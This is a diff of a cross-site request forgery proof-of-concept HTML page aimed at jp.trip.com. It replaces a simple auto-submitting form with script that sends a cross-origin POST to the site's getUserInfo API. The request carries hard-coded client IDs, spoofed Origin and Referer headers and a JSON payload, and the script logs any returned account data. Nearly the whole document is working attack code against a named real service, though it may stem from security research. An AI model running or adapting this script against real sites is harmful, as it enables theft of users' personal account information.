@@ -6,12 +6,52 @@
     <title>CSRF PoC</title>
 </head>
 <body>
-    <form action="https://jp.trip.com/membersinfo/profile/?locale=ja-JP&curr=INR" method="GET" id="csrfForm">
+    <form action="https://jp.trip.com/restapi/soa2/27024/getUserInfo?_fxpcqlniredt=09034039319202464984&x-traceID=09034039319202464984-1781777120505" method="POST" id="csrfForm">
         <input type="hidden" name="locale" value="ja-JP">
-        <input type="hidden" name="curr" value="INR">
+        <input type="hidden" name="accessCode" value="IBUPCAUTEHNTICATE">
+        <input type="hidden" name="head" value='{"cid":"09034039319202464984","ctok":"","cver":"1.0","lang":"01","sid":"8888","syscode":"09","auth":"","xsid":"","extension":[],"Locale":"ja-JP","Language":"jp","Currency":"INR","ClientID":"09034039319202464984"}'>
     </form>
     <script>
-        document.getElementById('csrfForm').submit();
+        var xhttp = new XMLHttpRequest();
+        xhttp.open("POST", "https://jp.trip.com/restapi/soa2/27024/getUserInfo?_fxpcqlniredt=09034039319202464984&x-traceID=09034039319202464984-1781777120505", true);
+        xhttp.setRequestHeader("Content-Type", "application/json");
+        xhttp.setRequestHeader("x-ctx-Locale", "ja-JP");
+        xhttp.setRequestHeader("x-ctx-Currency", "INR");
+        xhttp.setRequestHeader("x-ctx-ubt-pvid", "7");
+        xhttp.setRequestHeader("x-ctx-ubt-vid", "1781601012940.d6282vo5V7sr");
+        xhttp.setRequestHeader("x-ctx-wclient-req", "d4a4fdc5e596f95f3eb2094ba5e6ced2");
+        xhttp.setRequestHeader("x-ctx-ubt-sid", "8");
+        xhttp.setRequestHeader("x-ctx-Country", "JP");
+        xhttp.setRequestHeader("w-payload-source", "1.0.9@102!6CgeqByQ6FTb+Ejl9ECaKr9lGSA2OrTLKSbnOlGpGSkIOSKS+EOdKPAbOrK2+ET5+rApbbbpOSkpOSTZKr45Orb/bEqDOtbpbEbIKEKLKEKIKSAIKlbnOEGL+rkLbEAZ+EA2KEA5Kr4IOEbD9EGn+Ej2wSF6OZOnbb==");
+        xhttp.setRequestHeader("x-ctx-ubt-pageid", "10650138482");
+        xhttp.setRequestHeader("Origin", "https://jp.trip.com");
+        xhttp.setRequestHeader("Referer", "https://jp.trip.com/membersinfo/profile?locale=ja-JP&curr=INR");
+        
+        xhttp.onreadystatechange = function() {
+            if (this.readyState === 4 && this.status === 200) {
+                console.log(this.responseText);
+            }
+        };
+        var payload = {
+            "locale": "ja-JP",
+            "accessCode": "IBUPCAUTEHNTICATE",
+            "head": {
+                "cid": "09034039319202464984",
+                "ctok": "",
+                "cver": "1.0",
+                "lang": "01",
+                "sid": "8888",
+                "syscode": "09",
+                "auth": "",
+                "xsid": "",
+                "extension": [],
+                "Locale": "ja-JP",
+                "Language": "jp",
+                "Currency": "INR",
+                "ClientID": "09034039319202464984"
+            }
+        };
+        xhttp.send(JSON.stringify(payload));
     </script>
 </body>
 </html>
